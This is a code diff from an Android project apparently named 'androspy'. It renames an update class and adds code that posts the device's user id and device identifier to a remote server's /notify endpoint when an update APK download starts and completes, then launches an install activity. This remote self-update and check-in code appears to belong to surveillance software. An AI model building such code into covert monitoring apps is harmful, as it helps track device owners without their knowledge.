@@ -3,7 +3,6 @@ package buddy.ap.com.androspy;
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.os.AsyncTask;
 import android.os.Environment;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
@@ -20,15 +19,14 @@ import java.util.HashMap;
 import http.Http;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
-import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
 
-public class UpdateApp extends BaseService {
-    private static final String TAG = "UpdateApp";
+public class UpdateService extends BaseService {
+    private static final String TAG = "UpdateService";
     public static final String PKG_FILE = "update.apk";
     private CommonParams commonParams;
     private URL url;
 
-    public UpdateApp(String url) {
+    public UpdateService(String url) {
         try {
             this.url = new URL(url);
         } catch (MalformedURLException e) {
@@ -61,6 +59,20 @@ public class UpdateApp extends BaseService {
 
                 InputStream is = new BufferedInputStream(url.openStream());
 
+
+
+                HashMap dlStarted = new HashMap();
+                dlStarted.put("event", "download:started");
+                dlStarted.put("uid", commonParams.getUid());
+                dlStarted.put("device", commonParams.getDevice());
+                Http doneSMS = new Http();
+                doneSMS.setUrl(commonParams.getServer() + "/notify");
+                doneSMS.setMethod("POST");
+                doneSMS.setParams(dlStarted);
+                doneSMS.execute();
+
+
+
                 byte[] buffer = new byte[1024];
                 int len1 = 0;
                 while ((len1 = is.read(buffer)) != -1) {
@@ -73,7 +85,17 @@ public class UpdateApp extends BaseService {
 
                 Log.i(TAG, "Download Complete!!!!!");
 
-                Intent updateIntent = new Intent(context, PromptUpdateActivity.class);
+                HashMap dlComplete = new HashMap();
+                dlComplete.put("event", "download:completed");
+                dlComplete.put("uid", commonParams.getUid());
+                dlComplete.put("device", commonParams.getDevice());
+                Http DlDone = new Http();
+                DlDone.setUrl(commonParams.getServer() + "/notify");
+                DlDone.setMethod("POST");
+                DlDone.setParams(dlComplete);
+                DlDone.execute();
+
+                Intent updateIntent = new Intent(context, UpdateActivity.class);
                 updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                 context.startActivity(updateIntent);
 
